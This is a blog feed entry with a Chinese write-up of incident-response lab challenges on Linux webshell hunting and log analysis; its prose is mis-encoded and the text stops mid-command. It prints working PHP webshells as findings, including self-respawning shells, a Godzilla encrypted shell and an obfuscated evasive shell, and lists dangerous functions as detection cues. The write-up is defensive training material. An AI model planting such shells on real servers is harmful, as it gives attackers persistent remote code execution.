    <link href="https://clowsman.github.io/2024/07/02/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%B8%80%E7%AB%A0/"/>
    <id>https://clowsman.github.io/2024/07/02/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%B8%80%E7%AB%A0/</id>
    <published>2024-07-02T05:33:05.000Z</published>
    <updated>2024-07-15T08:45:57.790Z</updated>
    
    <content type="html"><![CDATA[<h1 id="linuxå…¥ä¾µæ’æŸ¥"><a href="#Linuxå…¥ä¾µæ’æŸ¥" class="headerlink" title="Linuxå…¥ä¾µæ’æŸ¥"></a>Linuxå…¥ä¾µæ’æŸ¥</h1><p>è¿™æ˜¯é¶æœºçš„ç®€ä»‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">è´¦å·ï¼šroot å¯†ç ï¼šlinuxruqin<br>ssh root@IP<br>1.webç›®å½•å­˜åœ¨æœ¨é©¬ï¼Œè¯·æ‰¾åˆ°æœ¨é©¬çš„å¯†ç æäº¤<br>2.æœåŠ¡å™¨ç–‘ä¼¼å­˜åœ¨ä¸æ­»é©¬ï¼Œè¯·æ‰¾åˆ°ä¸æ­»é©¬çš„å¯†ç æäº¤<br>3.ä¸æ­»é©¬æ˜¯é€šè¿‡å“ªä¸ªæ–‡ä»¶ç”Ÿæˆçš„ï¼Œè¯·æäº¤æ–‡ä»¶å<br>4.é»‘å®¢ç•™ä¸‹äº†æœ¨é©¬æ–‡ä»¶ï¼Œè¯·æ‰¾å‡ºé»‘å®¢çš„æœåŠ¡å™¨ipæäº¤<br>5.é»‘å®¢ç•™ä¸‹äº†æœ¨é©¬æ–‡ä»¶ï¼Œè¯·æ‰¾å‡ºé»‘å®¢æœåŠ¡å™¨å¼€å¯çš„ç›‘ç«¯å£æäº¤<br></code></pre></td></tr></table></figure><p>å…ˆç®€å•äº†è§£ä¸€ä¸‹ä¸æ­»é©¬ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://cloud.tencent.com/developer/article/1922141">https://cloud.tencent.com/developer/article/1922141</a></p><p><a href="https://blog.csdn.net/weixin_44411509/article/details/129267982">https://blog.csdn.net/weixin_44411509/article/details/129267982</a></p><p>ä¸æ­»é©¬çš„åŸç†å°±æ˜¯å…¶è¿›ç¨‹ä¸ä¼šæ¶ˆäº¡ï¼Œåœ¨å†…å­˜ä¸­ä¸æ–­åˆ›å»ºæœ¨é©¬æ–‡ä»¶ï¼Œä»è€Œè¾¾åˆ°æ— æ³•åˆ é™¤çš„ç›®çš„ã€‚</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¸æ­»é©¬ä¾‹å­ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>                                                                                                               <span class="hljs-meta">?&gt;</span><span class="hljs-string">&#x27;;</span><br><span class="hljs-string">file_put_contents(&quot;shell.php&quot;, $content);</span><br><span class="hljs-string">usleep(10000);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1. ignore_user_abort()å‡½æ•°ï¼šå‡½æ•°è®¾ç½®ä¸å®¢æˆ·æœºæ–­å¼€æ˜¯å¦ä¼šç»ˆæ­¢è„šæœ¬çš„æ‰§è¡Œï¼Œå¦‚æœè®¾ç½®ä¸ºtrueï¼Œåˆ™å¿½ç•¥ä¸ç”¨æˆ·çš„æ–­å¼€ï¼›ä¹Ÿå°±æ˜¯è®¿é—®äº†è¿™ä¸ªé¡µé¢ä¹‹åï¼Œè„šæœ¬ä¼šä¸€ç›´åœ¨åå°æ‰§è¡Œã€‚<br>2. set_time_limit()å‡½æ•°ï¼šè®¾ç½®å…è®¸è„šæœ¬è¿è¡Œçš„æ—¶é—´ï¼Œå•ä½ä¸ºç§’ã€‚å¦‚æœè®¾ç½®ä¸º0ï¼ˆé›¶ï¼‰ï¼Œæ²¡æœ‰æ—¶é—´æ–¹é¢çš„é™åˆ¶ã€‚<br>3. unlink(__FILE__)å‡½æ•°ï¼šåˆ é™¤æ–‡ä»¶æœ¬èº«ã€‚<br>4. file_put_contentså‡½æ•°ï¼šå°†ä¸€ä¸ªå­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ã€‚<br>5. usleepå‡½æ•°ï¼šå»¶è¿Ÿæ‰§è¡Œå½“å‰è„šæœ¬è‹¥å¹²å¾®ç§’ï¼ˆä¸€å¾®ç§’ç­‰äºä¸€ç™¾ä¸‡åˆ†ä¹‹ä¸€ç§’ï¼‰ã€‚<br></code></pre></td></tr></table></figure><p>è¿˜å¯ä»¥ç»™ä¸æ­»é©¬åŠ ä¸€ä¸ªå¯†ç ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>                                                                                                                                                                                                     <span class="hljs-meta">?&gt;</span><span class="hljs-string">&#x27;;</span><br><span class="hljs-string">    while (1)&#123;</span><br><span class="hljs-string">        file_put_contents($file,$code);</span><br><span class="hljs-string">        usleep(5000);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¦æ¸…é™¤ä¸æ­»é©¬çš„è¯å°±éœ€è¦é€šè¿‡é‡å¯ä¸»æœºæˆ–æœåŠ¡ï¼Œæˆ–è€…æ¡ä»¶ç«äº‰çš„æ–¹å¼ä¿®æ”¹æ–‡ä»¶å†…å®¹</p><p><strong>å¼€å§‹æ’æŸ¥</strong></p><p>å…ˆè¿›webç›®å½•ï¼Œçœ‹åˆ°ä¸€ä¸ª1.phpé‡Œé¢æ˜¯ä¸€å¥è¯æœ¨é©¬</p><p><img src="http://cdn.clown2024.cn/202407151645934.png" alt="image-20240709111702355"></p><p>æŸ¥çœ‹å¼€æ”¾çš„ç«¯å£ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">netstat -pantu<br><span class="hljs-meta prompt_">#</span><span class="language-bash">--------</span><br>-p è¡¨ç¤ºæ˜¾ç¤ºè¿›ç¨‹æ ‡è¯†ç¬¦å’Œ/æˆ–è¿›ç¨‹åç§°ï¼Œè¿™å¯ä»¥å¸®åŠ©ä½ æŸ¥çœ‹å“ªä¸ªè¿›ç¨‹æ­£åœ¨ä½¿ç”¨ç½‘ç»œè¿æ¥ã€‚<br>-a è¡¨ç¤ºæ˜¾ç¤ºæ‰€æœ‰æ´»åŠ¨çš„ TCP è¿æ¥å’Œç›‘å¬ç«¯å£ã€‚<br>-n è¡¨ç¤ºä»¥æ•°å­—å½¢å¼æ˜¾ç¤ºåœ°å€å’Œç«¯å£å·ï¼Œä¸è¿›è¡ŒåŸŸåè§£æã€‚<br>-t è¡¨ç¤ºæ˜¾ç¤º TCP è¡¨ã€‚<br>-u è¡¨ç¤ºæ˜¾ç¤º UDP è¡¨ã€‚<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645935.png" alt="image-20240709112640729"></p><p>ç”¨è¯¥å‘½ä»¤æŸ¥æ‰¾ç‰¹å¾æ–‡ä»¶ï¼š</p><figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">find ./ -name <span class="hljs-string">&quot;*.php&quot;</span> | xargs grep <span class="hljs-string">&quot;eval(&quot;</span><br><span class="hljs-comment">#å°†æ ‡å‡†è¾“å…¥æ•°æ®è½¬æ¢æˆå‘½ä»¤è¡Œå‚æ•°ï¼Œä¹Ÿå°±æ˜¯å°†findçš„è¾“å…¥å˜æˆå‘½ä»¤è¡Œå‚æ•°ä¼ é€’ç»™grepå‘½ä»¤</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645936.png" alt="image-20240709112605958"></p><p>å»æŸ¥ä¸€ä¸‹å¯†ç ä¸º<strong>hello</strong></p><p><img src="http://cdn.clown2024.cn/202407151645937.png" alt="image-20240709112733521"></p><p>çœ‹ä¸€ä¸‹index.phpçš„å†…å®¹å¯ä»¥çŸ¥é“é€šè¿‡è¯¥æ–‡ä»¶ç”Ÿæˆï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><span class="hljs-keyword">include</span>(SYS_ROOT.INC.<span class="hljs-string">&#x27;common.php&#x27;</span>);<br><span class="hljs-variable">$path</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PATH_INFO&#x27;</span>].(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]?<span class="hljs-string">&#x27;?&#x27;</span>.<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;?&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]):<span class="hljs-string">&#x27;&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$path</span>, <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)==<span class="hljs-string">&#x27;/&#x27;</span>)&#123;<br>        <span class="hljs-variable">$path</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$path</span>,<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-variable">$path</span> = <span class="hljs-title class_">Base</span>::<span class="hljs-title function_ invoke__">safeword</span>(<span class="hljs-variable">$path</span>);<br><span class="hljs-variable">$ctrl</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]:<span class="hljs-string">&#x27;run&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;createprocess&#x27;</span>]))<br>&#123;<br>        <span class="hljs-title class_">Index</span>::<span class="hljs-title function_ invoke__">createhtml</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]:<span class="hljs-number">0</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cat&#x27;</span>],<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;single&#x27;</span>]);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title class_">Index</span>::<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$path</span>);<br>&#125;<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;/var/www/html/.shell.php&#x27;</span>;<br><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;5d41402abc4b2a76b9719d911017c592&quot;)&#123;@eval($_POST[cmd]);&#125;?&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$code</span>);<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2021-01-01 00:00:01&quot; .shell.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">3000</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>é»‘å®¢ç•™äº†ä¸€ä¸ªæœ¨é©¬æ–‡ä»¶ï¼Œå°±æ˜¯<strong>shell(1).elf</strong>æ–‡ä»¶</p><p><img src="http://cdn.clown2024.cn/202407151645938.png" alt="image-20240709113120553"></p><p>å¯ä»¥çœ‹åˆ°æ²¡æœ‰å¯æ‰§è¡Œæƒé™ï¼Œè¿™é‡ŒåŠ ä¸€ä¸ªæƒé™ï¼Œç„¶åå¼€å¦ä¸€ä¸ªç«¯å£æŸ¥çœ‹ç«¯å£æƒ…å†µ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 777 shell\(1\).elf<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645939.png" alt="image-20240709113441330"></p><p>æœ€åå¯ä»¥çœ‹åˆ°å…¶ipä¸º<strong>10.11.55.21</strong>ï¼Œç«¯å£ä¸º3333</p><p>æœ€ç»ˆçš„å„ä¸ªflagå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">flag&#123;1&#125;<br>flag&#123;hello&#125;<br>flag&#123;index.php&#125;<br>flag&#123;10.11.55.21&#125;<br>flag&#123;3333&#125;<br></code></pre></td></tr></table></figure><h2 id="ç”¨å·¥å…·çš„åšæ³•"><a href="#ç”¨å·¥å…·çš„åšæ³•" class="headerlink" title="ç”¨å·¥å…·çš„åšæ³•"></a>ç”¨å·¥å…·çš„åšæ³•</h2><p>ç”¨Dç›¾æ¥è¿›è¡Œæ‰«æ,ä¸è¿‡Dç›¾æ²¡æœ‰Linuxç‰ˆæœ¬ï¼Œæ‰€ä»¥éœ€è¦é€šè¿‡å°†è¿œç¨‹çš„Linuxæ–‡ä»¶ç³»ç»ŸæŒ‚è½½åˆ°Windowsä¸Šé¢ï¼Œç„¶åç”¨Dç›¾æ‰«å³å¯ã€‚</p><p>è¿™é‡Œå‚è€ƒè¿™ç¯‡æ–‡ç« æ¥å¸ƒç½®ï¼š<a href="https://developer.aliyun.com/article/1341008">https://developer.aliyun.com/article/1341008</a></p><p>é‡‡ç”¨çš„æ–¹æ³•æ˜¯<strong>winfsp + sshfs-win</strong>ï¼Œè¿™ä¸¤ä¸ªç›´æ¥ç½‘ä¸Šä¸‹è½½å®‰è£…å¥½å³å¯ï¼š<a href="https://winfsp.dev/rel/">https://winfsp.dev/rel/</a></p><p>ç¬¬ä¸€ç§æ–¹æ³•æ˜¯å³å‡»æ­¤ç”µè„‘é€‰æ‹©æ˜ å°„ç½‘ç»œé©±åŠ¨å™¨ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151645940.png" alt="image-20240709122109922"></p><blockquote><p>æˆ–è€…è¾“å…¥sshfs.rï¼Œsshfsæ˜¯æŒ‚è½½ç”¨æˆ·å®¶ç›®å½•ï¼Œsshfs.ræ˜¯æŒ‚è½½è¿œç¨‹çš„æ ¹ç›®å½•</p><p>ç‚¹å‡»å®Œæˆåè¾“å…¥å¯†ç å³å¯æŒ‚è½½</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151645941.png" alt="image-20240709122150458"></p><p>ç„¶åç›´æ¥ç”¨Dç›¾è¿›è¡Œæ‰«æwebç›®å½•ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151645942.png" alt="image-20240709122701725"></p><p>æˆ–è€…ç”¨sshfs-manage(sshfsçš„ç•Œé¢åŒ–å·¥å…·ï¼Œè¦å•ç‹¬å†å»ä¸‹è½½)å°†Linuxç›®å½•æŒ‚è½½åˆ°Windowsï¼Œè¿™é‡Œå°±æ‡’å¾—è¯•äº†ğŸ˜¥</p><p>è¿˜å¯ä»¥ç”¨net useå‘½ä»¤æŒ‚è½½ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">net use              //åˆ—å‡ºæ‰€æœ‰ç½‘ç»œè¿æ¥<br>net use Z: /del      //åˆ é™¤æœ¬æœºæ˜ å°„çš„Zç›˜ <br>net use * /del /y    //åˆ é™¤æ‰€æœ‰æ˜ å°„å’ŒIPC$<br>net use Z: \\sshfs\root@192.168.1.120\/         //å°†å¯¹æ–¹æ ¹ç›®å½•æ˜ å°„ä¸ºZç›˜<br>net use Z: \\sshfs.r\root@192.168.1.120         //å°†å¯¹æ–¹æ ¹ç›®å½•æ˜ å°„ä¸ºZç›˜<br>net use Z: \\sshfs.r\root@192.168.1.120!1234    //å°†å¯¹æ–¹æ ¹ç›®å½•æ˜ å°„ä¸ºZç›˜ï¼ˆå…¶ä»–ç«¯å£ï¼‰<br></code></pre></td></tr></table></figure><h1 id="weshellæŸ¥æ€"><a href="#weshellæŸ¥æ€" class="headerlink" title="weshellæŸ¥æ€"></a>weshellæŸ¥æ€</h1><p>é¶æœºç®€ä»‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">é¶æœºè´¦å·å¯†ç  root xjwebshell<br>1.é»‘å®¢webshellé‡Œé¢çš„flag flag&#123;xxxxx-xxxx-xxxx-xxxx-xxxx&#125;<br>2.é»‘å®¢ä½¿ç”¨çš„ä»€ä¹ˆå·¥å…·çš„shell githubåœ°å€çš„md5 flag&#123;md5&#125;<br>3.é»‘å®¢éšè—shellçš„å®Œæ•´è·¯å¾„çš„md5 flag&#123;md5&#125; æ³¨ : /xxx/xxx/xxx/xxx/xxx.xxx<br>4.é»‘å®¢å…æ€é©¬å®Œæ•´è·¯å¾„ md5 flag&#123;md5&#125;<br></code></pre></td></tr></table></figure><p>ç›´æ¥ä¸ŠDç›¾æ‰«ï¼Œç”¨çš„è¿˜æ˜¯ä¸Šé¢çš„æ–¹æ³•</p><p><img src="http://cdn.clown2024.cn/202407151645943.png" alt="image-20240709155032413"></p><p>å…ˆçœ‹ä¸€ä¸ªç®€å•çš„shellæ–‡ä»¶</p><p><img src="http://cdn.clown2024.cn/202407151645944.png" alt="image-20240709155214961"></p><p>è¿™å°±æ˜¯ä¸€ä¸ªç®€å•çš„webshell</p><p>å†æ‰¾æ‰¾å…¶ä»–çš„ï¼Œåœ¨gz.phpæ‰¾çš„çš„webshellæ¯”è¾ƒç‰¹åˆ«</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">session_start</span>();<br>@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$D</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br><span class="hljs-comment">//027ccd04-5065-48b6-a32d-77c704a5e26d</span><br><span class="hljs-variable">$payloadName</span>=<span class="hljs-string">&#x27;payload&#x27;</span>;<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;3c6e0b8a9c15224a&#x27;</span>;<br><span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$data</span>!==<span class="hljs-literal">false</span>)&#123;<br>    <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]))&#123;<br>        <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>],<span class="hljs-variable">$key</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)===<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$payload</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">encode</span>(@<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$data</span>),<span class="hljs-variable">$key</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$data</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ˜¯ç¬¬ä¸€ä¸ªflagï¼Œflag{027ccd04-5065-48b6-a32d-77c704a5e26d}</p><p>ç„¶åå°±æ˜¯çœ‹æ˜¯ä»€ä¹ˆç±»å‹çš„webshellï¼Œè¿™é‡Œå¯ä»¥æ˜æ˜¾çœ‹åˆ°æ˜¯å“¥æ–¯æ‹‰çš„æµé‡ç‰¹å¾ï¼Œæ˜¯å“¥æ–¯æ‹‰é‡Œé¢çš„ä¸€ä¸ªå¼‚æˆ–åŠ å¯†è„šæœ¬</p><p>å“¥æ–¯æ‹‰çš„githubåœ°å€ï¼š<a href="https://github.com/BeichenDream/Godzilla%EF%BC%8C%E7%84%B6%E5%90%8E%E8%BF%9B%E8%A1%8Cmd5%E5%B0%B1%E6%98%AFflag%EF%BC%8Cflag%7B39392de3218c333f794befef07ac9257%7D">https://github.com/BeichenDream/Godzillaï¼Œç„¶åè¿›è¡Œmd5å°±æ˜¯flagï¼Œflag{39392de3218c333f794befef07ac9257}</a></p><p>éšè—shellå°±æ˜¯ä¸Šé¢Dç›¾æŸ¥æ‰¾å‡ºçš„.Mysqlli.php</p><p><img src="http://cdn.clown2024.cn/202407151645945.png" alt="image-20240709160839574"></p><p>ä¹Ÿæ˜¯ä¸€ä¸ªå“¥æ–¯æ‹‰çš„shellï¼Œè·¯å¾„å°±ä¸ºï¼š&#x2F;var&#x2F;www&#x2F;html&#x2F;include&#x2F;Db&#x2F;.Mysqli.phpï¼Œflagä¸ºflag{aebac0e58cd6c5fad1695ee4d1ac1919}</p><p>æœ€åä¸€ä¸ªæ˜¯å…æ€é©¬ï¼Œè¿™é‡Œé™æ€æ£€æµ‹å°±æ£€æµ‹ä¸åˆ°äº†ï¼Œä½†æ˜¯webshellæ‰§è¡Œçš„è¯ä¼šåœ¨æ—¥å¿—ç•™ä¸‹è®°å½•ï¼Œå¯ä»¥å»æ—¥å¿—é‡Œé¢çœ‹ä¸€çœ‹ï¼ŒLinuxçš„æ—¥å¿—åœ¨**&#x2F;var&#x2F;log**ç›®å½•ä¸‹</p><p>ä¸è¿‡Dç›¾å·²ç»æŠŠä»–æ‰«å‡ºæ¥äº†ï¼Œå°±æ˜¯top.phpï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨æ—¥å¿—access.logä¸­çœ‹åˆ°ä»–çš„è®°å½•</p><p><img src="http://cdn.clown2024.cn/202407151645946.png" alt="image-20240709161714553"></p><p>top.phpå†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$key</span> = <span class="hljs-string">&quot;password&quot;</span>;<br><br><span class="hljs-comment">//ERsDHgEUC1hI</span><br><span class="hljs-variable">$fun</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;func&#x27;</span>]);<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$fun</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-variable">$fun</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$fun</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">7</span>];<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;a&quot;</span>;<br><span class="hljs-variable">$s</span> = <span class="hljs-string">&quot;s&quot;</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$a</span>.<span class="hljs-variable">$s</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;func2&quot;</span>];<br><span class="hljs-variable">$c</span>(<span class="hljs-variable">$fun</span>);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè¿›è¡Œäº†æ··æ·†å’ŒåŠ å¯†ï¼Œè·¯å¾„md5å°±æ˜¯flagï¼Œflag{EEFF2EABFD9B7A6D26FC1A53D3F7D1DE}</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/administratorlws/article/details/139521078%EF%BC%8C%E9%87%8C%E9%9D%A2%E6%9C%89%E6%89%8B%E5%B7%A5%E6%9F%A5%E6%9D%80%E7%9A%84%E6%96%B9%E5%BC%8F%EF%BC%8C%E6%80%BB%E7%BB%93%E4%BA%86%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81webshell%E7%89%B9%E5%BE%81">https://blog.csdn.net/administratorlws/article/details/139521078ï¼Œé‡Œé¢æœ‰æ‰‹å·¥æŸ¥æ€çš„æ–¹å¼ï¼Œæ€»ç»“äº†ä¸€äº›å¸¸è§webshellç‰¹å¾</a></p><p>è¿™é‡Œcopyä¸€äº›çŸ¥è¯†ç‚¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">//å„webshellçš„å±é™©å‡½æ•°<br>PHP: eval(), system(), exec(), shell_exec(), passthru(), assert(), base64_decode()<br>ASP: Execute(), Eval(), CreateObject()<br>JSP: Runtime.getRuntime().exec()<br><br>//æ–‡ä»¶æ“ä½œ<br>PHP: fopen(), fwrite(), file_get_contents(), file_put_contents()<br>ASP: FileSystemObject<br><br>//ç½‘ç»œæ“ä½œ<br>PHP: fsockopen(), curl_exec(), file_get_contents(&#x27;http://...&#x27;)<br>ASP: WinHttp.WinHttpRequest<br></code></pre></td></tr></table></figure><p>æ‰‹å·¥æŸ¥æ€å…æ€å¯ä»¥çœ‹ä»–æœ‰æ²¡æœ‰ç¼–ç å‡½æ•°</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find ./ <span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;*.php&quot;</span> | xargs grep <span class="hljs-string">&quot;eval(&quot;</span><br></code></pre></td></tr></table></figure><h1 id="linuxæ—¥å¿—åˆ†æ"><a href="#Linuxæ—¥å¿—åˆ†æ" class="headerlink" title="Linuxæ—¥å¿—åˆ†æ"></a>Linuxæ—¥å¿—åˆ†æ</h1><p>é¶æœºç®€ä»‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">è´¦å·rootå¯†ç linuxrz<br>ssh root@IP<br>1.æœ‰å¤šå°‘IPåœ¨çˆ†ç ´ä¸»æœºsshçš„rootå¸å·ï¼Œå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨&quot;,&quot;åˆ†å‰²<br>2.sshçˆ†ç ´æˆåŠŸç™»é™†çš„IPæ˜¯å¤šå°‘ï¼Œå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨&quot;,&quot;åˆ†å‰²<br>3.çˆ†ç ´ç”¨æˆ·åå­—å…¸æ˜¯ä»€ä¹ˆï¼Ÿå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨&quot;,&quot;åˆ†å‰²<br>4.ç™»é™†æˆåŠŸçš„IPå…±çˆ†ç ´äº†å¤šå°‘æ¬¡<br>5.é»‘å®¢ç™»é™†ä¸»æœºåæ–°å»ºäº†ä¸€ä¸ªåé—¨ç”¨æˆ·ï¼Œç”¨æˆ·åæ˜¯å¤šå°‘<br></code></pre></td></tr></table></figure><p>é¦–å…ˆæŸ¥çœ‹æœ‰å¤šå°‘ipåœ¨çˆ†ç ´sshçš„rootè´¦å·é‚£å°±å»æŸ¥çœ‹&#x2F;var&#x2F;logä¸‹çš„æ—¥å¿—</p><p><img src="http://cdn.clown2024.cn/202407151645947.png" alt="image-20240709182756986"></p><p>çœ‹auth.log.1é‡Œé¢çš„ç™»é™†å¤±è´¥ä¿¡æ¯ï¼Œè¿™ä¸ªæ˜¯auth.logçš„å½’æ¡£æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/log/auth.log.1 | grep -a <span class="hljs-string">&quot;Failed password for root&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span 